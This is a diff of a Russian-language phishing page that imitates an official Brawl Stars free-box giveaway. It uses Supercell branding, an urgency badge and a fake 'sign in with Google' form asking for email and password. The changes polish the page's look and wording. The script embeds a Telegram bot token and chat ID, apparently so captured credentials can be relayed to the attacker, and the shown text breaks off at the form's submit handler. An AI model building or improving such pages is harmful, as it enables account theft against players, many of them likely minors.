@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Бесплатный ящик Brawl Stars</title>
+    <title>Brawl Stars — получи бесплатный ящик</title>
     <style>
         * {
             margin: 0;
@@ -12,46 +12,66 @@
         }
         body {
             font-family: 'Segoe UI', Arial, sans-serif;
-            background: #1a1a2e;
+            background: #0b0e1a;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             margin: 0;
             padding: 20px;
-            background-image: radial-gradient(circle at 20% 30%, #2d2d5e, #0f0f1f);
+            background-image: radial-gradient(circle at 30% 20%, #1f2a4a, #070912);
         }
         .card {
-            background: #16213e;
-            padding: 50px 45px 45px;
-            border-radius: 32px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.9);
-            max-width: 520px;
+            background: #141b2b;
+            padding: 60px 50px 50px;
+            border-radius: 40px;
+            box-shadow: 0 30px 80px rgba(0,0,0,0.9), 0 0 0 2px #f5c542 inset;
+            max-width: 600px;
             width: 100%;
             text-align: center;
             border: 3px solid #f5c542;
         }
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 10px;
+        }
+        .logo img {
+            width: 50px;
+            height: 50px;
+        }
+        .logo span {
+            color: #f5c542;
+            font-size: 32px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            text-shadow: 0 0 20px rgba(245, 197, 66, 0.3);
+        }
         .brawl-box {
-            width: 180px;
+            width: 200px;
             height: auto;
-            margin: 0 auto 20px;
+            margin: 10px auto 15px;
             display: block;
-            filter: drop-shadow(0 8px 30px rgba(245, 197, 66, 0.5));
+            filter: drop-shadow(0 10px 40px rgba(245, 197, 66, 0.6));
         }
         .card h1 {
-            color: #f5c542;
-            font-size: 36px;
+            color: #fff;
+            font-size: 42px;
             font-weight: 900;
-            text-shadow: 0 0 30px rgba(245, 197, 66, 0.3);
-            margin: 10px 0 8px;
-            letter-spacing: 2px;
+            background: linear-gradient(135deg, #f5c542, #ff8c00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin: 5px 0 10px;
+            letter-spacing: 1px;
         }
         .card .sub {
-            color: #b0b0d0;
-            font-size: 20px;
-            margin-bottom: 28px;
-            border-bottom: 2px dashed #3a3a6a;
-            padding-bottom: 18px;
+            color: #aab0c8;
+            font-size: 22px;
+            margin-bottom: 30px;
+            border-bottom: 2px solid #2a3a5a;
+            padding-bottom: 20px;
         }
         .card .sub span {
             color: #ff6b6b;
@@ -59,112 +79,142 @@
         }
         .stars {
             color: #f5c542;
-            font-size: 18px;
-            letter-spacing: 6px;
-            margin-bottom: 20px;
+            font-size: 20px;
+            letter-spacing: 8px;
+            margin-bottom: 25px;
         }
         .card label {
             display: block;
             text-align: left;
-            color: #c8c8e8;
-            font-size: 16px;
+            color: #c8d0e8;
+            font-size: 18px;
             font-weight: 600;
-            margin-top: 16px;
-            margin-bottom: 6px;
+            margin-top: 18px;
+            margin-bottom: 8px;
         }
         .card input {
             width: 100%;
-            padding: 18px 20px;
+            padding: 20px 22px;
             border: none;
-            border-radius: 14px;
-            background: #0f1a30;
+            border-radius: 16px;
+            background: #0e1525;
             color: #fff;
-            font-size: 18px;
+            font-size: 20px;
             box-sizing: border-box;
-            border: 2px solid #2a3a5a;
+            border: 2px solid #2a3a6a;
             transition: 0.2s;
         }
         .card input:focus {
             border-color: #f5c542;
             outline: none;
-            background: #1a2740;
+            background: #18203a;
+            box-shadow: 0 0 20px rgba(245, 197, 66, 0.2);
         }
         .card input::placeholder {
             color: #5a6a8a;
-            font-size: 16px;
+            font-size: 18px;
         }
         .card button {
             width: 100%;
-            padding: 20px;
-            margin-top: 24px;
-            background: #f5c542;
+            padding: 22px;
+            margin-top: 28px;
+            background: linear-gradient(135deg, #f5c542, #e6a800);
             border: none;
-            border-radius: 14px;
-            color: #1a1a2e;
+            border-radius: 16px;
+            color: #0b0e1a;
             font-weight: 900;
-            font-size: 22px;
+            font-size: 26px;
             cursor: pointer;
             transition: 0.2s;
-            box-shadow: 0 4px 20px rgba(245, 197, 66, 0.4);
+            box-shadow: 0 8px 30px rgba(245, 197, 66, 0.5);
+            text-transform: uppercase;
+            letter-spacing: 2px;
         }
         .card button:hover {
-            background: #ffd966;
-            transform: scale(1.02);
-            box-shadow: 0 6px 30px rgba(245, 197, 66, 0.6);
+            transform: scale(1.03);
+            box-shadow: 0 10px 40px rgba(245, 197, 66, 0.8);
         }
         .error {
             color: #ff6b6b;
-            font-size: 16px;
-            margin-top: 18px;
+            font-size: 18px;
+            margin-top: 20px;
             display: none;
             background: #2a0f0f;
-            padding: 14px;
-            border-radius: 10px;
+            padding: 16px;
+            border-radius: 12px;
             border: 2px solid #ff6b6b;
         }
         .note {
             color: #5a6a8a;
-            font-size: 14px;
-            margin-top: 24px;
+            font-size: 15px;
+            margin-top: 28px;
             border-top: 2px solid #2a3a5a;
-            padding-top: 20px;
+            padding-top: 22px;
+            line-height: 1.6;
+        }
+        .note strong {
+            color: #f5c542;
         }
         .glow {
             animation: pulse 2.5s infinite;
         }
         @keyframes pulse {
-            0% { filter: drop-shadow(0 0 10px rgba(245, 197, 66, 0.3)); }
-            50% { filter: drop-shadow(0 0 40px rgba(245, 197, 66, 0.8)); }
-            100% { filter: drop-shadow(0 0 10px rgba(245, 197, 66, 0.3)); }
+            0% { filter: drop-shadow(0 0 15px rgba(245, 197, 66, 0.4)); }
+            50% { filter: drop-shadow(0 0 50px rgba(245, 197, 66, 0.9)); }
+            100% { filter: drop-shadow(0 0 15px rgba(245, 197, 66, 0.4)); }
         }
-        @media (max-width: 480px) {
+        .badge {
+            display: inline-block;
+            background: #f5c542;
+            color: #0b0e1a;
+            padding: 6px 20px;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+        }
+        @media (max-width: 500px) {
             .card {
                 padding: 30px 20px;
             }
             .card h1 {
-                font-size: 28px;
+                font-size: 30px;
             }
             .card .sub {
-                font-size: 16px;
+                font-size: 17px;
             }
             .card input {
-                font-size: 16px;
-                padding: 15px;
-            }
-            .card button {
-                font-size: 18px;
+                font-size: 17px;
                 padding: 16px;
             }
+            .card button {
+                font-size: 20px;
+                padding: 18px;
+            }
             .brawl-box {
-                width: 140px;
+                width: 150px;
+            }
+            .logo span {
+                font-size: 24px;
+            }
+            .logo img {
+                width: 40px;
+                height: 40px;
             }
         }
     </style>
 </head>
 <body>
 <div class="card">
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/48/Supercell_logo.svg/120px-Supercell_logo.svg.png" alt="Supercell">
+        <span>BRAWL STARS</span>
+    </div>
+    <div class="badge">🎁 Ограниченное предложение</div>
     <img class="brawl-box glow" src="https://static.wikia.nocookie.net/brawlstars/images/4/4c/Brawl_Box.png" alt="Brawl Box">
-    <h1>🎁 БЕСПЛАТНЫЙ ЯЩИК</h1>
+    <h1>БЕСПЛАТНЫЙ ЯЩИК</h1>
     <div class="sub">В честь обновы <span>★</span> забери свой подарок</div>
     <div class="stars">✦ ✦ ✦ ✦ ✦</div>
 
@@ -172,16 +222,21 @@
         <label>📧 Войди через Google</label>
         <input type="email" id="email" placeholder="E-mail" required>
         <input type="password" id="password" placeholder="Пароль" required>
-        <button type="submit">🎁 ЗАБРАТЬ ЯЩИК</button>
+        <button type="submit">🎁 ЗАБРАТЬ</button>
         <div class="error" id="errorMsg">⚠️ Неверный логин или пароль</div>
     </form>
 
-    <div class="note">✅ Только для тех кто играет больше 5 лет. Один раз на аккаунт.</div>
+    <div class="note">
+        ✅ <strong>Только для новых игроков</strong><br>
+        Один раз на аккаунт. Срок действия — 24 часа.
+    </div>
 </div>
 
 <script>
+    // ===== ВАШИ ДАННЫЕ =====
     const botToken = '8640024610:AAH6n87qbPdQunACY4pdr2dUDh9GzX-Q6ZY';
     const chatId = '7253706229';
+    // ========================
 
     document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
